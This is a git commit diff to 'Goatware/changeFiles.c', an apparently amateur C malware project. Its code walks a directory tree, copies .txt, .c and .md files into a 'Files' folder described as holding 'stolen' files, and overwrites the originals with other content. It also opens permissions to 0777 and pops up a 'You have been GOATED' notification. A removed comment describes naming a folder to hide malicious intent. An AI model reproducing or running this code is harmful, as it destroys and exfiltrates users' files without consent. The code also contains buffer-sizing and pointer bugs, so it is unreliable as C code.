c2b4a602b037396f66aab733d9f20983c0846f9b
Ryan Liu <liu.3892@osu.edu>
2016-11-29 22:14:14 -0500

    Add copying files function

--- Goatware/changeFiles.c
+++ Goatware/changeFiles.c
@@ -5,34 +5,48 @@
 #include <dirent.h>
 #include <stdio.h>
 #include <string.h>
-#include <stat.h>
+#include <sys/stat.h>
 #include <stdlib.h>
+#include <pwd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <math.h>
 
 void changeTxt(struct dirent *entry, const char *direct);
 void changeC(struct dirent *entry, const char *direct);
 void changeMd(struct dirent *entry, const char *direct);
 void openDir(const char *direct, int level);
-int copyFile(char * paths[]) {
+void givePermission();
+int copyFile(char *address, char *destPath);
 
-int main(void) {
-	//Change first param of changeDir to a directory path to indicate which directory you want to explore
-	char *fileCollectionAddress;
-	struct passwd *password = getpwuid(getuid());
-	const char *homeDirectory = password->pw_dir;
-	strcpy(fileCollectionAddress,homeDirectory);
-	strcat(fileCollectionAddress, "/games2");
-	//created directory which led to 'games2' to subtly hide from user malicious intent
-	mkdir(fileCollectionAddress, 0777);
+char copyToDir[1024];
+
+int main(int argc, const char *argv[]) {
+	
+	// Create folder "Files" to store all taken files
+	if (mkdir("Files", 0777) < 0 && errno != EEXIST) {
+		perror("mkdir failed");
+		exit(EXIT_FAILURE);
+	}
+	chmod("Files", 0777);
+	// Path of "Files" directory in current working directory
+	getcwd(copyToDir, sizeof(copyToDir));
+	strcat(copyToDir, "/Files");
+	
+	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
 	openDir("test", 0);
 
-    char command[100], msg[1000];
+	char command[100], msg[1000];
 
-    strcpy(command,"notify-send ");
-    strcpy(msg,"\"You have been GOATED. If you would like to see any of your precious files again... Ryan can you come up with something lol\"");
-    strcat(command,msg);
+	strcpy(command,"notify-send ");
+	strcpy(msg,"\"You have been GOATED.\"");
+	strcat(command,msg);
 
-    system(command);
-    return 0;
+	// Send system message
+	system(command);
+
+	// Give permission to access stolen files
+	givePermission();
 	return 0;
 }
 
@@ -50,19 +64,26 @@ void openDir(const char *direct, int level) {
 		return;
 
 	do {
+		char name[strlen(entry->d_name)];
+		strcpy(name, entry->d_name);
 		if (entry->d_type == DT_DIR) {
 			// Skip if directory starts with a '.'			
-			char name[strlen(entry->d_name)];
-			strcpy(name, entry->d_name);
 			char first = name[0];
-			if (first == '.' || strcmp(name, "Goatware") == 0) {
+			if (first == '.' ) {
 				continue;
 			}
-
+			
 			// Create directory address path		
 			char directPath[1024];
 			int length = snprintf(directPath, sizeof(directPath)-1, "%s/%s", direct, entry->d_name);
 			directPath[length] = 0;
+
+			// Compare with current directory path
+			char cwdTemp[1024];
+			getcwd(cwdTemp, sizeof(cwdTemp));
+			if (strcmp(cwdTemp, directPath) == 0 || strcmp(name, "Goatware") == 0) { //DELETE SECOND PART (STRCMP(NAME... when done
+				continue;
+			}
 
 			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
 				continue;
@@ -71,15 +92,6 @@ void openDir(const char *direct, int level) {
 			openDir(directPath, level + 1);
 		}
 		else {
-			// set up to copy original file to goatware folder
-			char * paths[2];
-			strcpy(paths[0], direct);
-			strcat(paths[0], "/");
-			strcat(paths[0], name);
-			strcpy(paths[1], fileCollectionAddress);
-			strcat(paths[1], "/");
-			strcat(paths[1], name);
-			copyFile(paths);
 			/* Changes file if is a .txt, .c, or .md file */
 			changeTxt(entry, direct); 
 			changeC(entry, direct);
@@ -88,33 +100,48 @@ void openDir(const char *direct, int level) {
 	} while (entry = readdir(dir));
 	closedir(dir);
 }
-//copies original file to goatware folder
-int copyFile(char * paths[]) {
 
+// Gives permission to access all the files that were stolen
+void givePermission() {
+	DIR *dir;
+	struct dirent *entry;
+
+	dir = opendir("Files");
+	entry = readdir(dir);
+	
+	if (!dir)
+		return;
+	if (!entry)
+		return;
+
+	do {
+		chmod(entry->d_name, 0777);
+		printf("%s has been given access permission.\n", entry->d_name);
+	} while (entry = readdir(dir));
+}
+
+//copies original file to goatware folder
+int copyFile(char *address, char *destPath) {
     int sourceFolder, destinationFolder, x, reader;
     unsigned char buffer[4096];
-    char * sourcePath, destinationPath;
 
-
-    sourcePath = paths[1];
-    destinationPath = paths[2];
-    sourceFolder = open(sourcePath, O_RDONLY);
-    destinationFolder = open(destinationPath, O_CREAT | O_WRONLY);
-
+    sourceFolder = open(address, O_RDONLY);
+    destinationFolder = open(destPath, O_CREAT | O_WRONLY);
+	
     while (1) {
         reader = read(sourceFolder, buffer, 4096);
         if (reader == -1) {
-            printf("File Reading Error.\n");
-            exit(1);
+             printf("File Reading Error. address %s destPath: %s\n", address, destPath);
+            return 1;
         }
         x = reader;
 
-        if (n == 0) break;
-
+        if (x == 0) break;
+	
         reader = write(destinationFolder, buffer, x);
         if (reader == -1) {
-            printf("File Writing Error.\n");
-            exit(1);
+             printf("File Writing Error. address %s destPath: %s\n", address, destPath);
+             return 1;
         }
     }
 
@@ -122,9 +149,16 @@ int copyFile(char * paths[]) {
     close(destinationFolder);
 }
 void changeTxt(struct dirent *entry, const char *direct) {
+	int entryLength = strlen(entry->d_name);
+
+	// fileName[] is name of current file to be stolen (will not be altered)
+	char fileName[entryLength];
+	strcpy(fileName, entry->d_name);
 
 	// name[] is name of current file, checkName is last four characters of file to see if it is '.txt'
-	int entryLength = strlen(entry->d_name);
+	if (entryLength < 4) {
+		return;
+	}
 	char name[entryLength];
 	char checkName[5];			
 
@@ -133,15 +167,22 @@ void changeTxt(struct dirent *entry, const char *direct) {
 	memcpy(checkName, &name[entryLength - 4], 4);
 	checkName[4] = '\0';
 
-	// Create address to .txt file			
-	int addressLen = strlen(direct) + strlen(entry->d_name);
-	char address[addressLen];
-	strcpy(address, direct);
-	strcat(address, "/");
-	strcat(address, name);
-
 	// Opens GoatInfo.txt and copies contents to selected file if it has .txt extension
 	if (strcmp(checkName, ".txt") == 0) { 
+		// Create address to copy .txt file to called destPath
+		char destPath[1024];
+		strcpy(destPath, copyToDir);
+		strcat(destPath, "/");
+		strcat(destPath, fileName);
+
+		// Create address to .txt file called address			
+		char address[1024];
+		strcpy(address, direct);
+		strcat(address, "/");
+		strcat(address, fileName);
+
+		copyFile(address, destPath);	
+
 		FILE *fp1, *fp2;
 		char ch;
 		if (strstr(address, "GoatInfo.txt") != NULL) {
@@ -167,8 +208,16 @@ void changeTxt(struct dirent *entry, const char *direct) {
 
 void changeC(struct dirent *entry, const char *direct) {
 	
-	// name[] is name of current file, checkName is last two characters of file to see if it is '.c'
 	int entryLength = strlen(entry->d_name);
+
+	// fileName[] is name of current file to be stolen (will not be altered)
+	char fileName[entryLength];
+	strcpy(fileName, entry->d_name);
+
+	// name[] is name of current file, checkName is last two characters of file to see if it is '.c'
+	if (entryLength < 2) {
+		return;
+	}
 	char name[entryLength];
 	char checkName[3];			
 
@@ -177,15 +226,22 @@ void changeC(struct dirent *entry, const char *direct) {
 	memcpy(checkName, &name[entryLength - 2], 2);
 	checkName[2] = '\0';
 
-	// Create address to .c file			
-	int addressLen = strlen(direct) + strlen(entry->d_name);
-	char address[addressLen];
-	strcpy(address, direct);
-	strcat(address, "/");
-	strcat(address, name);
-
 	// Opens GoatInfo.txt and copies contents to selected file if it has .c extension
 	if (strcmp(checkName, ".c") == 0) { 
+		// Create address to copy .c file to called destPath
+		char destPath[1024];
+		strcpy(destPath, copyToDir);
+		strcat(destPath, "/");
+		strcat(destPath, fileName);
+
+		// Create address to .c file			
+		char address[1024];
+		strcpy(address, direct);
+		strcat(address, "/");
+		strcat(address, fileName);
+
+		copyFile(address, destPath);	
+
 		FILE *fp1, *fp2;
 		char ch;
 		if (strstr(address, "changeFiles.c") != NULL && strstr(address, "renameProcess.c") != NULL) {
@@ -210,8 +266,16 @@ void changeC(struct dirent *entry, const char *direct) {
 }
 
 void changeMd(struct dirent *entry, const char *direct) {
-	// name[] is name of current file, checkName is last three characters of file to see if it is '.md'
 	int entryLength = strlen(entry->d_name);
+
+	// fileName[] is name of current file to be stolen (will not be altered)
+	char fileName[entryLength];
+	strcpy(fileName, entry->d_name);
+
+	// name[] is name of current file, checkName is last three characters of file to see if it is '.md'
+	if (entryLength < 3) {
+		return;
+	}
 	char name[entryLength];
 	char checkName[4];			
 
@@ -220,18 +284,25 @@ void changeMd(struct dirent *entry, const char *direct) {
 	memcpy(checkName, &name[entryLength - 3], 3);
 	checkName[3] = '\0';
 
-	// Create address to .txt file			
-	int addressLen = strlen(direct) + strlen(entry->d_name);
-	char address[addressLen];
-	strcpy(address, direct);
-	strcat(address, "/");
-	strcat(address, name);
-
 	// Opens GoatInfo.txt and copies contents to selected file if it has .md extension
 	if (strcmp(checkName, ".md") == 0) { 
+		// Create address to copy .md file to called destPath
+		char destPath[1024];
+		strcpy(destPath, copyToDir);
+		strcat(destPath, "/");
+		strcat(destPath, fileName);
+
+		// Create address to .md file			
+		char address[1024];
+		strcpy(address, direct);
+		strcat(address, "/");
+		strcat(address, fileName);
+
+		copyFile(address, destPath);	
+
 		FILE *fp1, *fp2;
 		char ch;
-
+	
 		fp1 = fopen("GoatInfo.txt", "r");				
 		fp2 = fopen(address, "w+");
 
